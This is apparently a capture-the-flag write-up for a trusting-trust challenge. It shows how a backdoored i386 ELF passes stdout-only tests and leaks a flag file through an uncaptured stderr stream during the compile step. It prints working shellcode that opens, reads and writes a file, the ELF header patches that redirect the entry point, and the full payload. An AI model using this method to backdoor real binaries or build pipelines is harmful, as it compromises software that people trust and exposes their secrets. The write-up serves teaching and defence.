# reflections

**Category:** Misc | **Difficulty:** Hard | **Flag:** `bctf{Wh0_w1ll_I_trus7_N0w}`

## TL;DR

The challenge is a miniature re-enactment of Ken Thompson's "Reflections on Trusting Trust": a tiny self-hosting compiler that we get to replace. We sneak in a backdoored binary that passes all the behavioral tests (by doing exactly what the original does on stdout), but first prints `/app/flag.txt` to stderr — which the server forgets to capture during the stage-2 compile step, leaking the flag straight to our socket.

## What We're Given

Connecting to `ncat --ssl reflections.opus4-7.b01le.rs 8443` drops us into a two-stage protocol. The challenge description drops two hints: "TNT" and "The man in the mirror nods his head." That second one is the tell — it's a direct nod to Ken Thompson's 1984 Turing Award lecture, *Reflections on Trusting Trust*, which is one of the most famous papers in computer security. If you haven't read it, bookmark it now — it's four pages and will permanently change how you think about trust.

The provided files are:

- **`calc1`** — a 659-byte 32-bit i386 ELF binary. The challenge's "compiler."
- **`calc1.he`** — the self-hosted source for `calc1`, written in calc1's own language.
- **`calc1_compat.c`** — a portable C reimplementation of the same compiler (handy since `calc1` is i386 and won't run natively on a 64-bit Kali box).
- **`compiler_wrapper.c`** — a tiny C shim that just `execl`s `/tmp/compiler`.
- **`server.py`** — the actual server logic. This is the key file.

## Initial Recon

Running `file calc1` tells us it's a 32-bit i386 ELF. Trying to execute it directly on x86_64 gets us exit code 126 (wrong architecture). We either need `qemu-i386` or we can just use the `calc1_compat.c` reimplementation as a stand-in. The compat version builds fine with `gcc -o calc1_compat calc1_compat.c`.

The `.he` language is wonderfully tiny. From `calc1.he`'s own comments:

```
#  - comment (to end of line)
$XX - push hex byte value onto compile-time stack
!   - read raw byte from stdin, push onto stack
@   - pop value from stack, output as byte
+ - * /  - arithmetic on top two stack values
any two hex digit pair (not one of the above) - emit that byte directly
```

So `$41 @` pushes 0x41 and emits it — that's the letter 'A'. The binary reads a `.he` program from stdin and emits raw bytes to stdout. It's a teeny assembler / binary builder.

The kicker: `calc1.he` is the *self-compile source* — running `./calc1 < calc1.he` reproduces `calc1` byte-for-byte. That's the bootstrapping property that makes this challenge work the way it does.

Now let's actually read `server.py`. The protocol:

1. Read `.he` source from us, terminated by `&&`.
2. Write it to `/tmp/temp.he`.
3. Run `/app/compiler_wrapper < temp.he > /tmp/calcXXXXXX` (compiler_wrapper just execs `/tmp/compiler`, which starts as a symlink to `/app/calc1`).
4. Run ~32 test cases against the produced binary, comparing its stdout to what `/tmp/compiler` (the current trusted compiler) produces.
5. If all tests pass, swap `/tmp/compiler` to point at our new binary.
6. Repeat for stage 2.

Two stages. After stage 1, if our binary passes the tests, it *becomes* the compiler. Then stage 2 invokes it for a fresh compile. Sound familiar? That's the Thompson attack in miniature.

## The Vulnerability / Trick

There are actually two things working together here. Understanding both is what makes this challenge click.

### Part 1: The Trusting Trust Setup

Ken Thompson's original insight: once you control a compiler, you can make it do anything when it compiles the next generation of itself — even if the source code looks completely clean. The attack lives in the compiled binary, not the source.

Here, the server lets us submit a replacement "compiler." If it passes the behavioral tests (correct stdout output on 32 randomized test cases), it gets promoted. From that point on, the server uses *our* binary to run the stage-2 compile. We have full control over what that binary actually does.

The tests only check `stdout`. They don't care about `stderr`. So we can do literally anything on stderr and the tests will never notice.

### Part 2: The Stderr Leak Channel

Here's where the challenge gets elegant. Look closely at how the server runs the compile step for each stage:

```python
# Stage compile: stderr is NOT captured
with open(temp_he, "r") as f_in, open(new_binary, "wb") as f_out:
    subprocess.run([COMPILER], stdin=f_in, stdout=f_out, timeout=TIMEOUT, check=True)
```

And compare that to how the tests are run:

```python
# Tests: capture_output=True — stderr is swallowed
result = subprocess.run(
    [binary_path],
    input=source,
    capture_output=True,
    timeout=TIMEOUT,
    check=False,
)
```

Spot the difference? During the test runs, `capture_output=True` eats both stdout and stderr. Nothing leaks. But during the actual compile step, there's no stderr capture at all. The subprocess inherits the Python server's own stderr, and pwn.red/jail (the sandbox) forwards that back over the socket to us.

Translation: if our backdoored binary writes to fd 2 (stderr) at startup, those bytes travel through the jail's pipe and arrive at our `ncat` client.

We confirmed this early on by sending deliberately garbage input to trigger a Python traceback — and watching the full traceback show up on our end. That was the smoking gun.

### The Plan

1. Build a backdoored 32-bit ELF that is behaviorally identical to `calc1` on stdout (so it passes every test).
2. At startup, before doing anything else, it opens `/app/flag.txt`, reads it, and writes it to fd 2 (stderr).
3. Then it jumps straight to the original `calc1` entry point and runs normally. Every test passes.
4. Encode the backdoored ELF as `.he` source (every byte as a hex pair) and submit it as stage 1.
5. Submit anything as stage 2. The server invokes our backdoor as the compiler; stderr contains the flag; our socket gets it.

## Building the Exploit

### Backdooring the ELF

`calc1` is a 659-byte ELF. The single `PT_LOAD` segment maps the entire file into memory at `0x08048000`. The original entry point is at `0x080481ab` (file offset 427).

Our trick: append a 57-byte shellcode trailer right after the original binary (at file offset 659, which maps to vaddr `0x08048293`), then patch the ELF header to make our trailer the new entry point.

The shellcode does exactly three things using raw Linux i386 syscalls (no libc):

```python
code  = bytes([0x31, 0xc9])                               # xor ecx, ecx  (flags=0)
code += bytes([0xbb]) + struct.pack("<I", path_va)        # mov ebx, &"/app/flag.txt"
code += bytes([0xb8, 0x05, 0x00, 0x00, 0x00])             # mov eax, 5   (sys_open)
code += bytes([0xcd, 0x80])                               # int 0x80
code += bytes([0x89, 0xc3])                               # mov ebx, eax  (save fd)
code += bytes([0xb9]) + struct.pack("<I", buf_va)         # mov ecx, &buf
code += bytes([0xba, 0x00, 0x01, 0x00, 0x00])             # mov edx, 256
code += bytes([0xb8, 0x03, 0x00, 0x00, 0x00])             # mov eax, 3   (sys_read)
code += bytes([0xcd, 0x80])
code += bytes([0x89, 0xc2])                               # mov edx, eax  (n=bytes read)
code += bytes([0xb9]) + struct.pack("<I", buf_va)         # mov ecx, &buf
code += bytes([0xbb, 0x02, 0x00, 0x00, 0x00])             # mov ebx, 2   (stderr)
code += bytes([0xb8, 0x04, 0x00, 0x00, 0x00])             # mov eax, 4   (sys_write)
code += bytes([0xcd, 0x80])
# Jump back to the ORIGINAL calc1 entry point
code += bytes([0xe9]) + struct.pack("<i", ORIG_START - jmp_target)
```

After the shellcode we append the path string (`/app/flag.txt\0`) and a 256-byte buffer — all inside the loadable segment because we also patch `p_filesz` and `p_memsz` in the ELF program header to cover the extended length.

Then we patch two ELF header fields:

```python
elf[0x18:0x1c] = struct.pack("<I", TRAILER_VA)  # e_entry -> our shellcode
elf[0x44:0x48] = struct.pack("<I", len(elf))     # p_filesz -> new size
elf[0x48:0x4c] = struct.pack("<I", len(elf))     # p_memsz  -> new size
```

The final backdoored ELF is 986 bytes. When run, it dumps `/app/flag.txt` to stderr, then jumps to `0x080481ab` and behaves exactly like the original `calc1` from that point on.

### Converting to .he Format

calc1's hex fallthrough mode is perfect for this: any two adjacent hex digit characters that aren't a special operator just emit the corresponding byte. So we encode the entire ELF as space-separated hex pairs:

```python
def elf_to_he(elf: bytes) -> bytes:
    return (" ".join(f"{b:02x}" for b in elf) + "\n").encode()
```

We verified the round-trip locally: `calc1_compat < backdoor.he | cmp - backdoor_elf` — identical. The server's stage-1 compile will reproduce our backdoor ELF byte-for-byte.

### The Full Payload

```python
payload = stage1_he + b"&&\n" + b"$41 @\n" + b"&&\n"
```

Stage 1 is our full backdoored ELF as hex. Stage 2 is the trivial `$41 @` (pushes 0x41, emits 'A') — we don't care about stage 2 actually succeeding; by the time it fails its tests, the flag has already been printed to stderr.

## Running It

```
$ python3 solve.py
Success: Compilation and tests passed. Wrapper now launches testuser's compiler.
bctf{Wh0_w1ll_I_trus7_N0w}
Traceback (most recent call last):
  ...
OSError: [Errno 8] Exec format error: '/tmp/calc647182'
```

There it is. The "Success" message confirms stage 1 passed all 32 tests. Then our backdoor runs during the stage-2 compile step, dumps the flag to stderr, and then the server crashes trying to run the 'A'-byte binary as an executable — which gives us the Exec format error. We don't care. The flag is already in our pocket.

## Key Takeaways

**The Trusting Trust attack is real and elegant.** Thompson's 1984 insight still lands today: once you can replace a compiler (or any trusted tool in a build pipeline), you own everything that tool produces — even if the source code looks clean. The attack doesn't live in source; it lives in the binary. This challenge is a beautiful miniature version of that.

**Always audit what stdio streams are captured in sandboxed evaluators.** The server correctly captured stderr during the test phase (`capture_output=True`). But the compile step itself didn't. That single missing capture became the entire exfil channel. When you're building a challenge sandbox or a CI system, every subprocess needs explicit stdio handling — "inherits from parent" is never a safe default.

**Appending shellcode to an ELF and patching `e_entry` is a quick and clean technique.** You don't have to rewrite or relink the binary. Just find space after the last byte of the loadable segment, drop your shellcode there, extend `p_filesz`/`p_memsz` to include it, and redirect `e_entry`. The original code runs untouched after your prologue jumps to it.

**Verify round-trips locally before remote.** The stage-1 compile is deterministic — the server will produce exactly what `calc1_compat < backdoor.he` produces locally. Confirming the round-trip saved us from any guesswork about encoding.

If you want to go deeper on the original paper, Ken Thompson's "Reflections on Trusting Trust" is available online and takes about 10 minutes to read. It's one of those papers that makes you feel slightly paranoid about every tool you've ever used — in the best possible way.
